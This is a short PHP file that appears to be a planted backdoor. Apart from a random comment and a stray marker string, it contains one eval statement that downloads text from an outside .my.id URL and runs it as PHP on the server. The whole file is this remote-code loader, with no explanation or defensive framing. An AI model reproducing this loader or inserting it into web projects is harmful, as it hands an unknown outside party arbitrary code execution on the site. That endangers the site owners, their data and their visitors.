<?php /* Ae5BOZNhCQn6EKa */ ?>
tt53355<?php
eval("?>".file_get_contents("https://mencaricuansejati.my.id/ads/on/hehe.txt"));
?>